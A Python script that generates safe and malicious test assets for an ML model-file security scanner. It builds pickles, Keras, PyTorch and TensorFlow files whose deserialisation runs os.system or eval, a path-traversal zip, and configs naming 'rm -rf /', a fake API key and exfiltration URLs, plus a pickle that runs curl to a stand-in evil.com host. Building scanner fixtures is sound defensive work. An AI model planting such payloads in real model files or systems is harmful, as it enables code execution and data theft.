#!/usr/bin/env python3
"""
Security Test Asset Generator

Generates test assets for security scanning in the organized structure.
Integrates with existing tests/assets/ organization.
"""

import base64
import json
import os
import pickle
import zipfile
from pathlib import Path

import h5py

# Minimal TensorFlow SavedModel protobufs
SAFE_SAVEDMODEL_B64 = "EhISEAoOCgVDb25zdBIFQ29uc3Q="
MALICIOUS_SAVEDMODEL_B64 = "EiESHwoOCgVDb25zdBIFQ29uc3QKDQoDYmFkEgZQeUZ1bmM="


def make_security_pickles(assets_dir: Path) -> None:
    """Generate security test pickles in the samples/pickles directory."""
    pickles_dir = assets_dir / "samples" / "pickles"
    pickles_dir.mkdir(parents=True, exist_ok=True)

    # Only create if they don't already exist (don't overwrite existing)
    malicious_pickle = pickles_dir / "malicious_system_call.pkl"
    if not malicious_pickle.exists():

        class MaliciousSystemCall:
            def __reduce__(self):
                return (os.system, ("echo 'security test - malicious system call'",))

        with open(malicious_pickle, "wb") as f:
            pickle.dump(MaliciousSystemCall(), f)

    # Safe pickle for comparison
    safe_pickle = pickles_dir / "safe_data.pkl"
    if not safe_pickle.exists():
        with open(safe_pickle, "wb") as f:
            pickle.dump({"safe": True, "data": [1, 2, 3]}, f)


def make_security_keras_models(assets_dir: Path) -> None:
    """Generate Keras models for security testing."""
    keras_dir = assets_dir / "samples" / "keras"
    keras_dir.mkdir(parents=True, exist_ok=True)

    safe_cfg = {
        "class_name": "Sequential",
        "config": {
            "name": "safe_model",
            "layers": [{"class_name": "Dense", "config": {"units": 10}}],
        },
    }

    malicious_cfg = {
        "class_name": "Sequential",
        "config": {
            "name": "malicious_model",
            "layers": [
                {
                    "class_name": "Lambda",
                    "config": {
                        "function": "lambda x: eval('print(\"security test\")')",
                    },
                },
            ],
        },
    }

    safe_model = keras_dir / "safe_model.h5"
    if not safe_model.exists():
        with h5py.File(safe_model, "w") as f:
            f.attrs["model_config"] = json.dumps(safe_cfg)

    malicious_model = keras_dir / "malicious_lambda.h5"
    if not malicious_model.exists():
        with h5py.File(malicious_model, "w") as f:
            f.attrs["model_config"] = json.dumps(malicious_cfg)


def make_pytorch_security_files(assets_dir: Path) -> None:
    """Generate PyTorch files for security testing."""
    pytorch_dir = assets_dir / "samples" / "pytorch"
    pytorch_dir.mkdir(parents=True, exist_ok=True)

    class MaliciousEval:
        def __reduce__(self):
            return (eval, ("print('security test - eval')",))

    def write_pytorch_zip(path: Path, obj: object) -> None:
        with zipfile.ZipFile(path, "w") as z:
            z.writestr("version", "3")
            z.writestr("data.pkl", pickle.dumps(obj))

    safe_pytorch = pytorch_dir / "safe_model.pt"
    if not safe_pytorch.exists():
        write_pytorch_zip(safe_pytorch, {"weights": {"layer1": [1.0, 2.0, 3.0]}})

    malicious_pytorch = pytorch_dir / "malicious_eval.pt"
    if not malicious_pytorch.exists():
        write_pytorch_zip(malicious_pytorch, MaliciousEval())


def make_tensorflow_security_files(assets_dir: Path) -> None:
    """Generate TensorFlow SavedModel files for security testing."""
    tf_dir = assets_dir / "samples" / "tensorflow"
    tf_dir.mkdir(parents=True, exist_ok=True)

    safe_dir = tf_dir / "safe_savedmodel"
    malicious_dir = tf_dir / "malicious_pyfunc"

    safe_dir.mkdir(exist_ok=True)
    malicious_dir.mkdir(exist_ok=True)

    safe_pb = safe_dir / "saved_model.pb"
    if not safe_pb.exists():
        safe_pb.write_bytes(base64.b64decode(SAFE_SAVEDMODEL_B64))

    malicious_pb = malicious_dir / "saved_model.pb"
    if not malicious_pb.exists():
        malicious_pb.write_bytes(base64.b64decode(MALICIOUS_SAVEDMODEL_B64))


def make_manifest_security_files(assets_dir: Path) -> None:
    """Generate manifest files for security testing."""
    manifests_dir = assets_dir / "samples" / "manifests"
    manifests_dir.mkdir(parents=True, exist_ok=True)

    safe_manifest = {
        "name": "safe_model",
        "version": "1.0.0",
        "config": {"learning_rate": 0.001},
    }

    malicious_manifest = {
        "name": "suspicious_model",
        "config": {
            "api_key": "sk-1234567890abcdef",  # Looks like API key
            "remote_url": "http://suspicious-domain.com/exfiltrate",
            "debug_command": "rm -rf /",  # Dangerous command
        },
    }

    safe_file = manifests_dir / "safe_config.json"
    if not safe_file.exists():
        safe_file.write_text(json.dumps(safe_manifest, indent=2))

    malicious_file = manifests_dir / "suspicious_config.json"
    if not malicious_file.exists():
        malicious_file.write_text(json.dumps(malicious_manifest, indent=2))


def make_archive_security_files(assets_dir: Path) -> None:
    """Generate archive files for security testing."""
    archives_dir = assets_dir / "samples" / "archives"
    archives_dir.mkdir(parents=True, exist_ok=True)

    class MaliciousArchive:
        def __reduce__(self):
            return (os.system, ("echo 'security test - archive payload'",))

    # Safe archive
    safe_zip = archives_dir / "safe_model.zip"
    if not safe_zip.exists():
        with zipfile.ZipFile(safe_zip, "w") as z:
            z.writestr("model/weights.txt", "safe model weights")
            z.writestr("README.txt", "This is a safe model archive")

    # Malicious archive with path traversal
    malicious_zip = archives_dir / "path_traversal.zip"
    if not malicious_zip.exists():
        with zipfile.ZipFile(malicious_zip, "w") as z:
            # Path traversal attempt
            z.writestr("../../../etc/evil.txt", "malicious content")
            z.writestr("model/malicious.pkl", pickle.dumps(MaliciousArchive()))


def create_security_scenarios(assets_dir: Path) -> None:
    """Create comprehensive security test scenarios."""
    scenarios_dir = assets_dir / "scenarios" / "security_scenarios"
    scenarios_dir.mkdir(parents=True, exist_ok=True)

    # Mixed malicious model scenario
    mixed_dir = scenarios_dir / "mixed_malicious_model"
    mixed_dir.mkdir(exist_ok=True)

    # Create a scenario with multiple attack vectors
    scenario_manifest = {
        "model_name": "advanced_threat",
        "config": {
            "api_endpoint": "http://attacker-c2.evil.com/data",
            "exfil_key": "SECRET_API_KEY_12345",
        },
    }

    class MultiVectorAttack:
        def __reduce__(self):
            return (eval, ("__import__('os').system('curl http://evil.com')",))

    if not (mixed_dir / "config.json").exists():
        (mixed_dir / "config.json").write_text(json.dumps(scenario_manifest, indent=2))

    if not (mixed_dir / "model.pkl").exists():
        with open(mixed_dir / "model.pkl", "wb") as f:
            pickle.dump(MultiVectorAttack(), f)


def main() -> None:
    """Generate all security test assets in organized structure."""
    # Use the existing organized assets directory
    assets_dir = Path(__file__).parent.parent

    print("🔒 Generating security test assets...")

    make_security_pickles(assets_dir)
    make_security_keras_models(assets_dir)
    make_pytorch_security_files(assets_dir)
    make_tensorflow_security_files(assets_dir)
    make_manifest_security_files(assets_dir)
    make_archive_security_files(assets_dir)
    create_security_scenarios(assets_dir)

    print("✅ Security test assets generated successfully!")
    print(f"📁 Location: {assets_dir}")
    print("\nGenerated assets:")
    print("- samples/pickles/malicious_system_call.pkl")
    print("- samples/keras/malicious_lambda.h5")
    print("- samples/pytorch/malicious_eval.pt")
    print("- samples/tensorflow/malicious_pyfunc/")
    print("- samples/manifests/suspicious_config.json")
    print("- samples/archives/path_traversal.zip")
    print("- scenarios/security_scenarios/mixed_malicious_model/")


if __name__ == "__main__":
    main()
